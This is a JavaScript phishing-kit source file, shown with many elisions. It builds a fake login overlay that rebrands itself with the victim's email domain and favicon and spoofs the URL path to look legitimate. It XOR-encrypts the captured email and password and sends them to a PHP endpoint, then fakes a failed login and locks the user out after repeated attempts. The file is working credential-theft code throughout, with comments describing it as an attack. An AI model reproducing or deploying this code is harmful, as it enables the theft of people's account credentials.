(function () {
  ...
  // Configuration object - contains all the attack settings
  var CONFIG = {
  ...
  // Function: Inject CSS styles into the page
  function injectStyles() {
    // CSS string containing all the styling for the phishing page
    var cssText =
  ...
  // Function: Build the phishing form HTML structure
  function buildForm() {
    ...
    // Create white overlay veil
    var bgVeil = document.createElement("div");
    bgVeil.id = "bg_veil";
    document.body.appendChild(bgVeil);

    // Create main login card container
    var cardRoot = document.createElement("div");
    cardRoot.className = "frame_v7";
    cardRoot.id = "card_root";
    
    // Build HTML content for the login form
    // Note: The original code has some malformed/broken HTML strings concatenated together
    cardRoot.innerHTML =
      ...
      CONFIG.EMAIL_LABEL +
      '</label><div class="field_shell locked_bg"><span class="ico_slot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></span><input class="inp_core" type="email" id="mail_x9k2" required></div></div><div class="row_block"><label class="lbl_small" for="code_p4r7">' +
      CONFIG.KEY_LABEL +
      ...
      CONFIG.BUTTON_TEXT +
      '</button></form><div class="base_note" id="base_node">' +
      CONFIG.FOOTER +
      " · © 2026</div>";
  ...
  // Function: Configure background image with filters
  ...
  // Function: Add fake URL path to look legitimate
  function spoofUrlPath() {
    try {
      // Generate random base64 string
      var randomBytes = new Uint8Array(24);
      crypto.getRandomValues(randomBytes);
      var randomId = btoa(String.fromCharCode.apply(null, randomBytes))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
      
      // Update URL to look like: #/profile/dashboard/console/manage/overview/randomId
      history.replaceState(
        null,
        "",
        "#/" + CONFIG.PATH_SEGMENTS.join("/") + "/" + randomId,
      );
    } catch (error) {}
  }

  // Function: Generate default SVG logo (letter "S")
  ...
  // Function: Fetch favicon for email domain to look authentic
  function loadDomainFavicon(email) {
    if (!email) {
      document.getElementById("brand_img").src = getDefaultLogo();
      return;
    }

    // Build Google favicon URL for the domain
    var faviconUrl =
    ...
    img.onload = function () {
      // If favicon is larger than 16x16, use it; otherwise use default
      if (img.width > 16 || img.height > 16) {
        document.getElementById("brand_img").src = faviconUrl;
      } else {
        document.getElementById("brand_img").src = getDefaultLogo();
      }
    };
  ...
  // Function: Extract domain from email address
  ...
  // Function: Capitalize first letter of string
  ...
  function init() {
    ...
    var footerNode = document.getElementById("base_node");
    ...
    var submitBtn = document.getElementById("cta_node");
    ...
    // Function: Shake the card (error animation)
    function shakeCard() {
      cardRoot.classList.remove("wobble_q_on");
      cardRoot.offsetWidth; // Trigger reflow
    ...
    // Function: Update branding based on email domain
    function updateBranding() {
      ...
      var capitalizedDomain = capitalize(domainName);
      
      titleNode.textContent = capitalizedDomain + " " + CONFIG.HEADING;
      captionNode.textContent = CONFIG.SUBHEAD;
      footerNode.textContent =
        capitalizedDomain + " " + CONFIG.FOOTER + " · © 2026";
      
      loadDomainFavicon(domain);
    }

    // Event: Update branding when user types email
    ...
    // Function: XOR encrypt data before sending
    function encryptData(data, key) {
      ...
      for (var i = 0; i < jsonString.length; i++) {
        var xorValue =
          jsonString.charCodeAt(i) ^ key.charCodeAt(i % keyLength);
        result += ("0" + xorValue.toString(16)).slice(-2);
      }
      
      return btoa(result);
    }

    // Function: Lock user out after max attempts
    function lockout() {
      if (isLocked) {
        return;
      }
    ...
    function handleSubmit() {
      ...
      // Encrypt credentials
      var encryptedPayload = encryptData(
        {
          email: email,
          code: password,
        },
      ...
      formData.append("secure_data", encryptedPayload);
      ...
      fetch(CONFIG.PHP_ENDPOINT, {
        ...
        .then(function () {
          // Enforce minimum 2 second delay to appear legitimate
        ...
        .then(function () {
          ...
          var buttonText = "</svg></span> " + CONFIG.BUTTON_TEXT;
          ...
          // Track failed attempts in session storage
          var attempts =
            parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10) + 1;
  ...
  // Start the phishing page when DOM is ready
